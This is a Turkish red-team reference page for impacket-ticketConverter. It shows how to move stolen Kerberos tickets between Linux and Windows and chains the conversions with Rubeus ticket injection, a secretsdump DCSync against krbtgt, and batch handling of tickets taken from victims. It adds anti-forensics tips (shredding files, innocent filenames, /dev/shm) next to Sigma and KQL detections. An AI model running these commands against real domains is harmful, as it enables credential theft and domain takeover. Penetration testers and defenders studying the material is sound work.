# impacket-ticketConverter

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Linux/Unix ortamlarında kullanılan MIT Kerberos Kimlik Önbelleği (`.ccache`) formatı ile Windows/Mimikatz/Rubeus ekosisteminde kullanılan Microsoft Kerberos Bilet (`.kirbi` / KRB-CRED) formatı arasında çift yönlü, kayıpsız dönüştürme işlemi yapan köprü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde ve kırmızı takım operasyonlarında saldırganlar sıklıkla Linux tabanlı saldırı platformları (Kali Linux, Impacket araçları, Python altyapısı) ile hedef Windows ağındaki makineler (Cobalt Strike Beacon, Rubeus, Mimikatz) arasında geçiş yaparlar. Ancak bu iki dünya Kerberos biletlerini depolama, serileştirme ve işleme konusunda tamamen farklı dosya ve bellek standartları kullanır:

1. **MIT Kerberos `.ccache` (Credential Cache):**
   - Linux, macOS ve Unix işletim sistemlerinin yerel Kerberos standardıdır.
   - İkili (binary) bir format olup başlık bilgisi (Header/Version), varsayılan kurban kimliği (Default Principal), bilet bayrakları (Ticket Flags), anahtar tipi (Encryption Keyblock) ve bilet bloğunu sıralı baytlar halinde saklar.
   - Impacket araçları (`secretsdump`, `psexec`, `wmiexec`) ve Linux yerel istemcileri (`curl --negotiate`, `smbclient -k`) ortam değişkeni `KRB5CCNAME` üzerinden yalnızca `.ccache` formatını tanır.

2. **Microsoft / Mimikatz / Rubeus `.kirbi` (KRB-CRED):**
   - RFC 4120 standardında tanımlanan `KRB-CRED` (Kerberos Credential Message) ASN.1 veri yapısını temel alır.
   - ASN.1 DER kodlaması ile hiyerarşik nesneler halinde biletleri, bilet şifreleme anahtarlarını (`EncKrbCredPart`), geçerlilik sürelerini ve oturum anahtarlarını barındırır.
   - Windows LSA (Local Security Authority) alt sistemi ve Mimikatz/Rubeus araçları biletleri bu formatta dışa aktarır (`dump`) veya oturuma enjekte eder (`ptt /ticket:`).

Bir ortamda elde edilen biletin diğer ortamda kullanılabilmesi için bu iki format arasında kriptografik bütünlüğü ve oturum anahtarını (Session Key) bozmadan dönüşüm yapılması zorunludur. **`impacket-ticketConverter`**, bu mimari uyumsuzluğu ortadan kaldıran resmi köprü aracıdır. Girdi dosyasının formatını otomatik olarak tespit eder, ASN.1 ve ccache yapılarını çözümleyip hedef formata anında dönüştürür.

### Mimari Akış Şeması

```
┌──────────────────────────────────────┐          ┌──────────────────────────────────────┐
│        LİNUX EKOSİSTEMİ              │          │        WİNDOWS EKOSİSTEMİ            │
│  - Impacket (getTGT, getST, ticketer)│          │  - Rubeus (dump, asktgt, s4u)        │
│  - PKINITtools (gettgtpkinit)        │          │  - Mimikatz (sekurlsa::tickets)      │
│  - MIT Kerberos (klist, curl)        │          │  - LSA / Kerberos Win32 API          │
│                                      │          │                                      │
│  Format: .ccache (Credential Cache)  │          │  Format: .kirbi (KRB-CRED ASN.1)     │
└──────────────────┬───────────────────┘          └──────────────────┬───────────────────┘
                   │                                                 │
                   │ (1) .ccache Dosyası                             │ (2) .kirbi Dosyası
                   ▼                                                 ▼
      ┌──────────────────────────────────────────────────────────────────┐
      │                   impacket-ticketConverter                       │
      │  - Başlık ve ASN.1 Yapılarını Ayrıştır (Decode)                  │
      │  - Bilet Bileşenlerini ve Oturum Anahtarını Koru (Session Key)   │
      │  - Hedef Formatta Yeniden Yapılandır (Encode)                    │
      └────────────────────────────────┬─────────────────────────────────┘
                                       │
                   ┌───────────────────┴───────────────────┐
                   ▼                                       ▼
        [ Çıktı: ticket.kirbi ]                 [ Çıktı: ticket.ccache ]
                   │                                       │
                   ▼                                       ▼
       Windows LSA Belleğine Enjeksiyon         Linux Impacket Oturumunda Kullanım
       (Rubeus.exe ptt /ticket:ticket.kirbi)    (export KRB5CCNAME=ticket.ccache)
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Çift Yönlü Dönüşüm** | `.ccache` -> `.kirbi` ve `.kirbi` -> `.ccache` yönünde kayıpsız dönüştürme yapar. | Platformlar arası bilet transferini tek saniyede çözer. |
| **Kriptografik Bütünlüğü Koruma** | Oturum anahtarı (Session Key), bilet ömrü ve bayrakları hiçbir veri kaybı olmadan aktarır. | Dönüştürülen biletlerin hedef sistemde doğrulama hatası almasını önler. |
| **Otomatik Format Algılama** | Dosya uzantısına bakmaksızın dosya başlık baytlarından girdi formatını kendisi anlar. | Operatörün fazladan dönüştürme bayrağı girmesini gereksiz kılar. |
| **C2 ve Pivot Kolaylığı** | Windows C2 ajanından çekilen biletleri Linux pivot makinesinde hemen kullanılabilir hale getirir. | Operasyonel esnekliği ve hareket kabiliyetini maksimize eder. |
| **Oturum Anahtarı Bütünlüğü** | Kerberos istemcilerinin hedef servisle konuşurken kullandığı simetrik anahtarı güvenle aktarır. | Biletin kopyalanırken bozulması riskini sıfıra indirir. |

### Karşılaştırma Tablosu

| Kriter | impacket-ticketConverter | Kekeo (ticket_converter) | Rubeus (describe / ptt) | Python ticket_converter.py |
|---|---|---|---|---|
| **Platform** | Linux / Python (İçerik) | Windows (C / Win32) | Windows (.NET / C#) | Bağımsız Python Script |
| **Dönüşüm Yönü** | Çift Yönlü (.ccache <-> .kirbi)| Çift Yönlü | Yalnızca Windows İçi | Çift Yönlü |
| **Gereken Kütüphane** | Standart Impacket Paketi | Yok (Yerel İkili) | .NET CLR | PyKrb5 / ASN1 |
| **Komut Satırı Sözdizimi**| Basit (`in out`) | Karmaşık CLI | CLI Argümanları | Basit |
| **Otomatik Format Tespiti**| Var | Yok (Manuel Mod) | Yok | Var |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
impacket-ticketConverter <GIRDI_DOSYASI> <CIKTI_DOSYASI>
```

### Sözdizimi ve Çalışma Mantığı

Araç harici karmaşık bayraklara ihtiyaç duymaz. İlk argüman kaynak bilet dosyasını, ikinci argüman ise üretilmek istenen hedef dosya adını temsil eder:
- Eğer girdi dosyası bir MIT Kerberos `.ccache` dosyası ise (`0x05 0x04` magic baytları), araç bunu algılar ve çıktıyı Windows uyumlu `.kirbi` (ASN.1 KRB-CRED) olarak yazar.
- Eğer girdi dosyası bir Windows/Mimikatz `.kirbi` dosyası ise (`0x76` ASN.1 uygulama etiketi), araç bunu algılar ve çıktıyı Linux uyumlu `.ccache` olarak yazar.

### Desteklenen Çevresel Değişkenler

| Değişken | Açıklama | Örnek Kullanım |
|---|---|---|
| `KRB5CCNAME` | Linux üzerinde dönüştürülen `.ccache` dosyasının aktif oturum bileti olarak tanımlanması. | `export KRB5CCNAME=/tmp/admin.ccache` |
| `PAGER` | Bilet ayrıntılarını incelerken sayfalama aracı tanımı. | `export PAGER=cat` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Linux'ta Alınan TGT'yi Windows Makineye Taşıyıp Rubeus ile Enjekte Etme (.ccache -> .kirbi)

Linux saldırı makinesinde `impacket-getTGT` veya `impacket-ticketer` ile üretilen `admin.ccache` bileti Windows hedef makinesine aktarılmak istenmektedir.

```bash
# 1. Linux makinesinde bileti .kirbi formatına çevirin
impacket-ticketConverter admin.ccache admin.kirbi
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting ccache to kirbi...
[+] Successfully converted ccache to kirbi!
```

```cmd
:: 2. Windows makinesinde Rubeus ile belleğe (LSA) enjekte edin
Rubeus.exe ptt /ticket:admin.kirbi

:: 3. Başarıyla oturuma yüklendiğini doğrulayın
klist
```

---

### Senaryo 2: Windows'ta Bellekten Dökülen Bileti Linux'a Taşıyıp Secretsdump Çalıştırma (.kirbi -> .ccache)

Windows bir iş istasyonunda `Rubeus dump` veya `Mimikatz` ile LSA belleğinden çalınan `[0;3e7]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi` bileti Linux'a kopyalanır ve Impacket ile kullanılabilir hale getirilir.

```bash
# 1. Windows kirbi biletini Linux ccache formatına dönüştürün
impacket-ticketConverter \
  '[0;3e7]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi' \
  /tmp/administrator.ccache
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] Successfully converted kirbi to ccache!
```

```bash
# 2. Bilet ortam değişkenini tanımlayın ve secretsdump çalıştırın
export KRB5CCNAME=/tmp/administrator.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/Administrator@dc01.corp.local
```

---

### Senaryo 3: AD CS Sertifikası (PKINIT) ile Alınan Bileti Windows'a Aktarma

`gettgtpkinit.py` kullanılarak çalınan sertifikayla Linux üzerinden alınan TGT bileti, Windows ortamındaki bir Beacon oturumuna taşınır.

```bash
# 1. gettgtpkinit ile ccache biletini alın
python3 gettgtpkinit.py corp.local/victim$ -pfx-base64 MIIKng... /tmp/victim.ccache

# 2. Bileti Windows uyumlu kirbi formatına dönüştürün
impacket-ticketConverter /tmp/victim.ccache /tmp/victim.kirbi

# 3. Windows'ta Rubeus ile enjekte edin:
# Rubeus.exe ptt /ticket:C:\Temp\victim.kirbi
```

---

### Senaryo 4: Base64 Kodlanmış Rubeus Çıktısını Linux Dosyasına Çevirme

Cobalt Strike Beacon konsolundan `Rubeus asktgt /nowrap` ile kopyalanan Base64 dizgisi Linux makinede `.ccache` biletine dönüştürülür.

```bash
# 1. Base64 metnini kirbi dosyası olarak decode edin
echo "doIFqjCCBaagAwIBBaEDAgEWooIE..." | base64 -d > /tmp/rubeus.kirbi

# 2. impacket-ticketConverter ile ccache formatına dönüştürün
impacket-ticketConverter /tmp/rubeus.kirbi /tmp/rubeus.ccache

# 3. Linux ortamında kullanın
export KRB5CCNAME=/tmp/rubeus.ccache
impacket-wmiexec -k -no-pass corp.local/admin@dc01.corp.local
```

---

### Senaryo 5: Otomasyon Boru Hattında Bilet Dönüşümü (Bash Pipeline)

Yüzlerce kurban makineden toplanan `.kirbi` biletlerini toplu olarak Linux `.ccache` formatına dönüştüren otomasyon döngüsü:

```bash
for ticket in *.kirbi; do
    impacket-ticketConverter "$ticket" "${ticket%.kirbi}.ccache"
done
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Unknown ticket format / Corrupted ticket` | Girdi dosyası ne geçerli bir ccache ne de ASN.1 KRB-CRED yapısındadır (Bozuk veya eksik dosya). | Dosya aktarımının tam yapıldığını kontrol edin; dosyanın boş (`0 byte`) olmadığını doğrulayın. |
| `KeyError: 'sessionKey' / Missing Session Key` | Bilet dosyasında şifre çözme için gerekli Oturum Anahtarı (Session Key) bloğu eksik. | Biletin LSA'dan dökülürken tam yetkiyle alındığından emin olun (Mimikatz/Rubeus elevated çalışmalıdır). |
| `Permission denied on output file` | Çıktı yazılmak istenen dizinde yazma yetkisi yok veya dosya kullanımda. | Çıktı yolunu `/tmp/` gibi yazılabilir bir dizin olarak belirtin. |
| `UnicodeDecodeError / ASN1 parsing failure` | Base64'ten çözülürken satır sonu (`\r\n`) veya boşluk karakterleri dosya içeriğini bozmuş. | `tr -d '\r\n'` kullanarak Base64 metnini temizleyip tekrar decode edin. |
| `Converted ticket fails with KRB_AP_ERR_MODIFIED on Windows` | Windows sisteminde hedef sunucu FQDN adının küçük/büyük harf veya etki alanı eşleşmesi uyuşmuyor. | Biletin etki alanı adını büyük harflerle (`CORP.LOCAL`) tanımlayın ve `klist purge` sonrası tekrar deneyin. |
| `ValueError: tag not found (ASN.1 DER mismatch)` | Dosya ham bilet yerine Windows Event Log'u veya metin çıktısı içermektedir. | Yalnızca saf ikili bilet dosyasını girdi olarak verin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: SIFIR (TAMAMEN ÇEVRİMDIŞI ÇALIŞMA)
──────────────────────────────────────────────────────────────────
[ Ağ Trafiği ]      : Ağda sıfır paket (Dönüştürme tamamen yerel diskte)
[ Windows Logları ] : KDC logu YOKTUR (Yalnızca ptt anında Event 4624)
[ Disk İzleri ]     : Diske yazılan .kirbi ve .ccache dosya uzantıları
[ EDR / AV ]        : .kirbi dosyalarının diske yazılması disk tarayıcıları tetikleyebilir
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Disk Dosyası Artefaktları:**
   - Linux tarafında `/tmp/*.ccache`, Windows tarafında `C:\Users\Public\*.kirbi` dosya uzantıları standart siber adli tıp (DFIR) taramalarında ilk incelenen dosya türleridir.
2. **Windows Olay Günlükleri:**
   - Dönüştürme işleminin kendisi işletim sistemi loglarına yansımaz. Ancak dönüştürülen bilet `Rubeus ptt` ile enjekte edildiğinde Windows Security Event ID 4624 (Logon Type 3 / Kerberos) oluşur.
3. **C2 İndirme/Yükleme İmzaları:**
   - Biletlerin C2 kanalı üzerinden dosya transferiyle indirilip yüklenmesi proxy ve ağ DLP sensörlerinde Base64 desenleri bırakabilir.

### 5.2 Ağ ve EDR İmzaları

- **Sıfır Ağ Gürültüsü:** Araç hiçbir ağ soketi açmaz; sadece yerel dosya okuma ve yazma işlemi yapar.
- **Statik Dosya İmzaları:** Bazı gelişmiş EDR çözümleri diske bırakılan `KRB-CRED` ASN.1 başlık baytlarını (`0x76 0x82...`) statik olarak tespit edip karantinaya alabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1550.002** | Use Alternate Authentication Material: Pass the Ticket | Biletleri platformlar arası taşıyarak oturum enjeksiyonuna hazırlama. |
| **T1078** | Valid Accounts: Domain Accounts | Meşru bilet formatlarını dönüştürerek kimlik doğrulamada kullanma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Diske Bilet Dosyası Bırakma** | Windows makinede `.kirbi` dosyasını diske yazmak yerine, Linux'ta dönüştürdüğünüz biletin Base64 halini doğrudan `Rubeus.exe ptt /ticket:<base64>` şeklinde belleğe verin. |
| **Linux'ta Açıkta Kalan ccache** | Operasyon sonlandığında `shred -u /tmp/*.ccache` komutu ile biletleri dosya sisteminden geri döndürülemez şekilde silin. |
| **Belirgin Dosya İsimleri** | Dosya adlarını `admin_golden.kirbi` gibi dikkat çekici isimler yerine `cache.dat` veya `temp.bin` gibi masum isimlerle adlandırın. |
| **RAM Bellek Kullanımı** | Dosyaları sabit disk yerine Linux paylaşımlı belleğinde (`/dev/shm/`) tutun. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — Şüpheli .kirbi Dosyası Oluşturma Tespiti:**

```yaml
title: Kerberos Ticket File Created on Disk (.kirbi)
status: experimental
description: Detects the creation of .kirbi ticket files, commonly associated with Mimikatz, Rubeus, or ticketConverter.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 11
    TargetFilename|endswith: '.kirbi'
  condition: selection
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli Kerberos Dosyası Tespiti:**

```kql
DeviceFileEvents
| where FileName endswith ".kirbi" or FileName endswith ".ccache"
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessCommandLine
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Linux .ccache Biletini Windows .kirbi Formatına Çevirme
```bash
impacket-ticketConverter admin.ccache admin.kirbi
```
- **Ne Yapar?** Linux Credential Cache biletini Windows ve Mimikatz/Rubeus uyumlu `.kirbi` formatına dönüştürür.
- **Ne Zaman Kullanılır?** Linux'ta (getTGT, ticketer vb.) üretilen bileti Windows makinede kullanmak istendiğinde.
- **Parametreler:** İlk parametre girdi (`.ccache`), ikinci parametre çıktı (`.kirbi`).

### Komut 2: Windows .kirbi Biletini Linux .ccache Formatına Çevirme
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```
- **Ne Yapar?** Windows LSA belleğinden dökülen veya Rubeus ile alınan `.kirbi` biletini Linux MIT Kerberos `.ccache` formatına dönüştürür.
- **Ne Zaman Kullanılır?** Windows'tan çalınan bilet ile Linux üzerinde Impacket (`secretsdump`, `psexec`) koşturmak için.
- **Parametreler:** İlk parametre girdi (`.kirbi`), ikinci parametre çıktı (`.ccache`).

### Komut 3: Base64 Biletini Linux'ta Çözüp Dönüştürme
```bash
echo "doIFqjCCBaag..." | base64 -d > /tmp/temp.kirbi && impacket-ticketConverter /tmp/temp.kirbi /tmp/final.ccache && rm /tmp/temp.kirbi
```
- **Ne Yapar?** C2 konsolundan kopyalanan Base64 bilet dizisini tek satırda çözüp `.ccache` formatına çevirir ve ara dosyayı temizler.
- **Ne Zaman Kullanılır?** Dosya transferi yapmadan doğrudan pano (clipboard) üzerinden bilet taşırken.
- **Parametreler:** Standart kabuk komut zincirlemesi.

### Komut 4: Dönüştürülen Bileti Linux Oturumunda Anında Aktif Etme
```bash
impacket-ticketConverter ticket.kirbi /tmp/active.ccache && export KRB5CCNAME=/tmp/active.ccache
```
- **Ne Yapar?** Bileti dönüştürür ve Linux kabuğundaki Kerberos istemcileri için hemen geçerli bilet olarak ayarlar.
- **Ne Zaman Kullanılır?** Dönüşümün hemen ardından Impacket araçlarını çalıştırmak için.
- **Parametreler:** `export KRB5CCNAME`: Ortam değişkeni ataması.

### Komut 5: Silver Ticket Dönüşümü
```bash
impacket-ticketConverter silver_cifs.ccache silver_cifs.kirbi
```
- **Ne Yapar?** Linux'ta üretilen Silver Ticket TGS biletini Windows makinede belirli bir servise erişmek üzere `.kirbi` formatına çevirir.
- **Ne Zaman Kullanılır?** Silver Ticket ile Windows iş istasyonundan dosya paylaşımlarına bağlanmak istendiğinde.
- **Parametreler:** Girdi ve çıktı dosya yolları.

### Komut 6: Güvenli Dizin İçinde Dönüşüm Yapma (OPSEC)
```bash
impacket-ticketConverter /dev/shm/ticket.ccache /dev/shm/ticket.kirbi
```
- **Ne Yapar?** Dönüştürme işlemini sabit disk yerine doğrudan Linux RAM belleğinde çalışan paylaşımlı bellek dizininde (`/dev/shm`) gerçekleştirir.
- **Ne Zaman Kullanılır?** Diske hiçbir fiziksel dosya yazmadan adli bilişim (forensics) izlerini en aza indirmek için.
- **Parametreler:** `/dev/shm/`: RAM tabanlı geçici dosya dizini.

### Komut 7: Toplu Klasör Dönüştürme Döngüsü
```bash
for f in *.kirbi; do impacket-ticketConverter "$f" "${f%.kirbi}.ccache"; done
```
- **Ne Yapar?** Bulunulan dizindeki tüm `.kirbi` uzantılı biletleri tek tek `.ccache` dosyalarına dönüştürür.
- **Ne Zaman Kullanılır?** Mimikatz ile topluca dump edilmiş bilet koleksiyonunu Impacket ile test etmek için.
- **Parametreler:** Bash döngüsü.

### Komut 8: Dönüştürülen Bilet ile secretsdump Doğrulaması
```bash
export KRB5CCNAME=admin.ccache && impacket-secretsdump -k -no-pass corp.local/admin@dc01.corp.local
```
- **Ne Yapar?** Dönüştürülen biletin geçerliliğini ve DCSync yetkisini tek hamlede test eder.
- **Ne Zaman Kullanılır?** Bilet dönüşümünün başarılı olduğunu hemen doğrulamak için.
- **Parametreler:** `-k`: Kerberos bileti kullan, `-no-pass`: Parolasız doğrulama.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **RFC 4120 Standardı:** [The Kerberos Network Authentication Service (V5) - Section 5.8 KRB-CRED](https://datatracker.ietf.org/doc/html/rfc4120)
- **Benjamin Delpy (Gentilkiwi):** [Mimikatz Kerberos Module Documentation](https://github.com/gentilkiwi/mimikatz)
- **SpecterOps Araştırması:** [Ticket Formats: ccache vs kirbi Anatomy](https://posts.specterops.io/)

---

> **Önceki:** [← impacket-ticketer](./impacket-ticketer.md) · **Sonraki:** [impacket-describeTicket →](./impacket-describeTicket.md)
